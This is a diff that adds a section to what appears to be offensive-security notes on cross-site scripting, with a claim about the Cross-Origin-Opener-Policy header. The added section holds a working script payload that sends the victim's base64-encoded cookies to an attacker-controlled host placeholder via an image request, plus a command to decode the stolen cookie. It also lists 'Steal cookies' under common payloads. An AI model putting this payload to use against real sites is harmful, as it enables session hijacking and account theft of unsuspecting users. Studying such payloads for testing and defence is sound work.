@@ -17,6 +17,21 @@ The data is included in dynamic content that is sent to a web user without being
 
 If the http header "httpOnly" is set to True, this prevents xss
 
+### Cross-Origin-Opener-Policy:
+
+If the http Header Cross-Origin-Opener-Policy is : same origin we cannot use xss payloads with fetch.
+But we can try this payload
+
+```javascript
+<script>img=new Image();img.src="http://[myip]:[myport]/?img="+btoa(document.cookie);</script>
+```
+
+When we receive the cookie decode it
+
+```shell
+echo -n [cookie] | base64 -d
+```
+
 ## Common Payloads
 
 Steal cookies
